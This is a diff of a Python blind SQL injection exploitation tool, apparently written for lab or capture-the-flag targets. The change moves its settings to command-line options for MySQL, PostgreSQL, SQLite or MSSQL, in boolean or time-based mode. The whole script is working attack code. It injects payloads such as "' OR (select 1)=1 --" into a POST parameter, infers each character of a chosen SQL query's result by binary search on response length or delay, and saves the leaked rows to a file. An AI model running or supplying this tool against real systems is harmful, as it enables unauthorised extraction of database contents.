@@ -2,77 +2,63 @@
 # -*- coding: utf-8 -*-
 
 import re
-import sys
 import time
 import urllib3
 import requests
 import datetime
 import argparse
-from enum import Enum
 
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 
-class DBType(Enum):
-    MySQL = 1
-    PostgreSQL = 2
-    SQLite = 3
-    MSSQL = 4
-
-
-class SQLiType(Enum):
-    Boolean = 1
-    Time = 2
-
-
-######### CHANGE THIS #########
-# database = DBType.MySQL
-database = DBType.PostgreSQL
-# database = DBType.SQLite
-# database = DBType.MSSQL
-sqlitype = SQLiType.Boolean
-# sqlitype = SQLiType.Time
-PRE = "' or"
-POST = '-- -'
-sleep_time = 2
-###############################
+# CHANGE THIS #
+PRE = "' OR"   # string to put before each payload
+POST = '--'    # string to after before each payload
+sleep_time = 2 # seconds to sleep in time based SQLi
+###############
 
 
 # CHANGE THIS
 def send_req(payload):
-    # print(payload)
-    params = {'pwn': payload}
+    #print(payload)
+    params = {}
     cookies = {}
+    headers = {}
+    data = {'pwn': payload}
     proxies = {}
     # proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
     url = 'http://10.10.10.10/index.php'
-    r = requests.get(url,
-                     params=params,
-                     verify=False,
-                     proxies=proxies,
-                     allow_redirects=False,
-                     cookies=cookies)
+    r = requests.post(
+        url,
+        params=params,
+        data=data,
+        headers=headers,
+        verify=False,
+        proxies=proxies,
+        allow_redirects=False,
+        cookies=cookies
+    )
     return r
 
-
-compare_value = None
 
 # printable chars:
 # 9, 10, 13, 11, 12
 # 32-126
 start_char = 9
 end_char = 126
-
+# max number of rows
+max_row_num = 50
+# max row length
+max_row_length = 1000
+# keep track of the number of requests made
 num_queries = 0
+# Content-Length in boolean and nanoseconds in time
+compare_value = None
 
 
-if database == DBType.MSSQL and sqlitype == SQLiType.Time:
-    exit('MSSQL only supports Boolean based SQLi, sorry!')
-
-
-def check_if_true(r, time_elapsed):
-    if sqlitype == SQLiType.Time:
+def check_if_true(sqlitype, r, time_elapsed):
+    if sqlitype == 'time':
         return time_elapsed >= compare_value
     else:
         # checking the content length is good enough for most cases
@@ -88,6 +74,10 @@ class Database():
         self.ascii = ''
         self.version_query = ''
         self.db_name = ''
+        self.type = ''
+
+    def set_type(self, sqli_type):
+        self.type = sqli_type
 
     def select_row(self, row_num):
         pass
@@ -105,7 +95,7 @@ class Database():
         global compare_value
         test_query = f'{PRE} (select 1)=1 {POST}'
         measurements = []
-        if sqlitype == SQLiType.Time:
+        if self.type == 'time':
             # this can be probably be done better
             for i in range(10):
                 start = time.time_ns()
@@ -122,14 +112,14 @@ class Database():
     def query_equals_true(self, payload):
         global num_queries
         num_queries += 1
-        if sqlitype == SQLiType.Time:
+        if self.type == 'time':
             payload = self.add_sleep(payload)
         payload = f'{PRE} {payload} {POST}'
         start = time.time_ns()
         r = send_req(payload)
         end = time.time_ns()
         time_elapsed = end - start
-        return check_if_true(r, time_elapsed)
+        return check_if_true(self.type, r, time_elapsed)
 
     def parse_query(self):
         parsed = {}
@@ -173,18 +163,18 @@ class Database():
         # check that the query actually returns something
         null_test = f"EXISTS({query})"
         if self.query_equals_true(null_test) is False:
-            print('the query did not return any results')
+            print('[!] the query did not return any results')
             return 0
 
         # check the it doesn't return NULL
         null_test = f"1 = (select count(1) from ({query}) as T where {col_name} IS NOT NULL)"
         if self.query_equals_true(null_test) is False:
-            print('the query returns NULL')
+            print('[!] the query returns NULL')
             return 0
 
         # get the length of the response
         start = 0
-        end = 5000  # this could be larger
+        end = max_row_length  # this could be larger
         while start != end:
             middle = (end + start) // 2
             payload = self.value_larger_than(query, middle)
@@ -196,7 +186,7 @@ class Database():
 
     def get_num_rows(self):
         start = 1
-        end = 5000  # this could be larger
+        end = max_row_num  # this could be larger
         while start != end:
             middle = (end + start) // 2
             payload = self.num_rows_larger_than(middle)
@@ -209,7 +199,7 @@ class Database():
     def leak_query(self, query):
         if query == '':
             query = self.version_query
-        print(f'query: {query}')
+        print(f'[i] query: {query}')
         self.query = query
         self.set_compare_value()
         self.parse_query()
@@ -219,7 +209,7 @@ class Database():
             num_rows = self.get_num_rows()
         else:
             num_rows = 1
-        print(f'num rows: {num_rows}\n')
+        print(f'[i] number of rows: {num_rows}')
         if num_rows == 0:
             return self.leaks
         try:
@@ -241,10 +231,10 @@ class Database():
                         else:
                             end = middle
                     leak += chr(start)
-                    print(f'leaking row {row_num}: {leak}', end='\r')
+                    print(f'[+] leaking row {row_num}: {leak}', end='\r')
 
-                print(f'leaked row {row_num}: {leak}  ')
                 if length > 0:
+                    print(f'[+] leaked row {row_num}: {leak}  ')
                     self.leaks.append(leak)
         except KeyboardInterrupt:
             print('')
@@ -357,45 +347,34 @@ def save_leak(query, leak):
                 f.write(f'row {i+1}: {entry}\n')
             f.write('\n')
         print('[+] saved all rows in output.txt')
-    else:
-        print('[!] no output!')
 
 
-def main(args):
+def main(db_type, sqli_type, query):
     print('\033[1m\033[94mBlind SQL injection script\033[0m\033[0m\n')
 
-    if database == DBType.PostgreSQL:
+    if db_type == 'postgresql':
         db = PostgreSQL()
-    elif database == DBType.MySQL:
+    elif db_type == 'mysql':
         db = MySQL()
-    elif database == DBType.SQLite:
+    elif db_type == 'sqlite':
         db = SQLite()
-    elif database == DBType.MSSQL:
+    elif db_type == 'mssql':
         db = MSSQL()
-    else:
-        exit('select a valid database!')
 
-    t = 'Boolean' if sqlitype == SQLiType.Boolean else 'Time'
-    print(f'exploiting: {db.db_name}, {t} based')
+    db.set_type(sqli_type)
+
+    print(f'[i] exploiting a {sqli_type} based SQL injection on {db.db_name}')
 
     start = time.time()
 
-    if args.query is not None:
-        query = args.query
-    else:
-        query = input('enter query: ')
-        sys.stdout.buffer.write(b"\033[F\033[K")
-        if query == '':
-            print('using demo query\n')
-
     # exploit!
     leak = db.leak_query(query)
-    save_leak(db.query, leak)
+    save_leak(query, leak)
 
     end = time.time()
     run_time = str(datetime.timedelta(seconds=round(end-start)))
 
-    print(f'[i] completed after {num_queries} queries in {run_time}')
+    print(f'[i] completed after {num_queries} requests in {run_time}')
 
 
 if __name__ == '__main__':
@@ -405,9 +384,25 @@ if __name__ == '__main__':
                             '--query',
                             dest='query',
                             help='The SQL query to leak',
-                            default=None)
+                            default='')
+        parser.add_argument('-db',
+                            '--database',
+                            dest='db',
+                            help='Database type',
+                            choices=['mysql', 'sqlite', 'mssql', 'postgresql'],
+                            required=True)
+        parser.add_argument('-t',
+                            '--type',
+                            dest='type',
+                            help='SQL injection type',
+                            choices=['time', 'boolean'],
+                            required=True)
         args = parser.parse_args()
-        main(args)
+
+        if args.db == 'mssql' and args.type == 'time':
+            exit('MSSQL only supports boolean based SQLi, sorry!')
+
+        main(args.db, args.type, args.query)
     except KeyboardInterrupt:
         print('')
 
